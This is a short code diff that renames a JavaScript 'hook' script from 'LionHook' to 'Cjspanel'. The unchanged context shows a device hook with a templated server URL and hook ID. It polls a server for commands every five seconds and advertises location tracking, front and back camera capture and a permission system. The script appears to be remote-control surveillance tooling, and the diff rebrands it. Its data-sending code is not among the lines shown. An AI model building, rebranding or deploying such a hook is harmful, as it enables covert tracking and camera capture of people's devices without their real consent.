@@ -5,7 +5,7 @@
     const serverUrl = '{{ server_url }}';
     const hookId = '{{ hook_id }}';
     
-    console.log('🦁 LionHook activated for device:', deviceId);
+    console.log('🦁 Cjspanel activated for device:', deviceId);
     console.log('Server URL:', serverUrl);
     
     // Command queue for pending actions
@@ -1232,7 +1232,7 @@ function isFrameBlack(imageData, threshold = 10) {
     // Check for commands every 5 seconds
     setInterval(checkCommands, 5000);
     
-    console.log('🦁 LionHook Advanced v3.0 fully activated!');
+    console.log('🦁 Cjspanel Advanced v3.0 fully activated!');
     console.log('✅ All enhanced features available:');
     console.log('   📍 Location tracking');
     console.log('   📷 Front & Back camera (improved)');
@@ -1244,7 +1244,7 @@ function isFrameBlack(imageData, threshold = 10) {
     console.log('   🔒 One-time permission system');
     
     // Make functions globally available
-    window.lionhook = {
+    window.Cjspanel = {
         deviceId,
         hookId,
         checkCommands,
